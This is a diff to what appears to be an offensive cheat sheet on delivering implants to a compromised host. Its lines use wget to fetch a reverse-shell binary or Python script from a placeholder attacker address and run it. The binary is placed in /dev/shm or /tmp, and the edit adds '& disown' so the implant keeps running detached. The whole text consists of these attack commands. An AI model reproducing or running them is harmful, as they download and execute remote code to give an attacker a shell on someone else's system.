@@ -17,7 +17,7 @@ $ wget -qO- http[s]://<IP>/implant.py | python
 Download reverse shell binary and execute it.
 
 ```
-$ wget -O /dev/shm/implant http[s]://<IP>/implant && chmod +x /dev/shm/implant && /dev/shm/implant
+$ wget -O /dev/shm/implant http[s]://<IP>/implant; chmod +x /dev/shm/implant; /dev/shm/implant & disown
 ```
 
 ## 03 - Dropping on disk
@@ -25,7 +25,7 @@ $ wget -O /dev/shm/implant http[s]://<IP>/implant && chmod +x /dev/shm/implant &
 Download reverse shell binary and execute it.
 
 ```
-$ wget -O /tmp/implant http[s]://<IP>/implant && chmod +x /tmp/implant && /tmp/implant
+$ wget -O /tmp/implant http[s]://<IP>/implant; chmod +x /tmp/implant; /tmp/implant & disown
 ```
 
 ## 03 - Compiled After Delivery
